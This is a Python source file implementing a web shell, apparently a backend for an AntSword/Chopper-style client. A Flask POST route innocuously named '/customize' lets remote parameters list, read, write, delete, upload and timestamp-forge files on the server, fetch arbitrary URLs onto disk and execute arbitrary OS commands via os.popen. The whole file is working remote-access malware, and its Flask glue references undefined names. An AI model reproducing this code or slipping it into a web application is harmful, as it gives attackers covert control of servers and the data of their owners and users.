# -*- coding:utf-8 -*-
import urllib
import os
import shutil
import time
import datetime


def getDirInfo(path):
    ret = {
        'f': [],
        'd': [],
    }
    pList = os.listdir(path)
    for p in pList:
        pp = path + p
        mtime = time.localtime(os.stat(pp).st_mtime)
        mtime = time.strftime('%Y-%m-%d %H:%M:%S', mtime)
        if os.path.isfile(pp):
            ret['f'].append(p + '\t' + mtime + '\t' + str(os.path.getsize(pp)) + '\t-\n')
        else:
            ret['d'].append(p + '/\t' + mtime + '\t0\t-\n')
    return ret


def main(req):
    Z = req['z']
    encoding = req['z0']
    Z1 = req['z1']
    Z2 = req['z2']
    Ret = '1'
    if Z == 'A':
        disk_list = list('abcdefghijklmnopqrstuvwxyz')
        exist_disk = ':'.join(filter(lambda x: os.path.isdir(x + ':'), disk_list)) + ':'
        return os.getcwd() + '\t' + exist_disk
    elif Z == 'B':
        Ret = ''
        dirinfo = getDirInfo(Z1)
        if len(dirinfo['d']) > 0:
            dirinfo['d'].sort(lambda a, b: 1 if a.upper() > b.upper() else -1)
            Ret += ''.join(dirinfo['d'])
        if len(dirinfo['f']) > 0:
            dirinfo['f'].sort(lambda a, b: 1 if a.upper() > b.upper() else -1)
            Ret += ''.join(dirinfo['f'])
    elif Z == 'C':
        fileHandle = open(Z1)
        Ret = fileHandle.read()
        fileHandle.close()
    elif Z == 'D':
        fileHandle = open(Z1, 'w')
        fileHandle.write(Z2)
        fileHandle.close()
    elif Z == 'E':
        if os.path.isfile(Z1):
            os.remove(Z1)
        else:
            shutil.rmtree(Z1)
    elif Z == 'F':
        fileHandle = open(Z1, 'rb')
        Ret = fileHandle.read()
        fileHandle.close()
    elif Z == 'G':
        fileHandle = open(Z1, 'wb')
        fileHandle.write(Z2.decode('hex'))
        fileHandle.close()
    elif Z == 'H':
        shutil.copyfile(Z1, Z2)
    elif Z == 'I':
        dirname = Z1[:Z1.rfind('\\') + 1]
        os.chdir(dirname)   # change working dir
        os.rename(Z1[Z1.rfind('\\') + 1:], Z2[Z2.rfind('\\') + 1:])
    elif Z == 'J':
        if os.path.exists(Z1) == False:
            os.mkdir(Z1)
    elif Z == 'K':
        TM = datetime.datetime.strptime(Z2, '%Y-%m-%d %H:%M:%S')
        TM = time.mktime(TM.timetuple())
        os.utime(Z1, (TM, TM))
    elif Z == 'L':
        urllib.urlretrieve(Z1, Z2)
    elif Z == 'M':
        os.popen('chcp 437 >nul&chcp 65001 >nul')
        cmd = ' '.join([Z1[2:], Z1[0:2], Z2])
        Ret = os.popen(cmd).read()
        os.popen('chcp 437')

    return Ret


def do(req):
    ret = main(req)
    ret = '\x2D\x3E\x7C' + str(ret or 1) + '\x7C\x3C\x2D'
    return ret



#
# TEST #
#

from flask import request
app.add_url_rule('/customize', 'customize', routes.customize.api, methods=['POST'])

def api():
    req_data = {
        'z': request.form.get('z'),
        'z0': request.form.get('z0'),
        'z1': request.form.get('z1'),
        'z2': request.form.get('z2'),
    }
    return do(req_data)
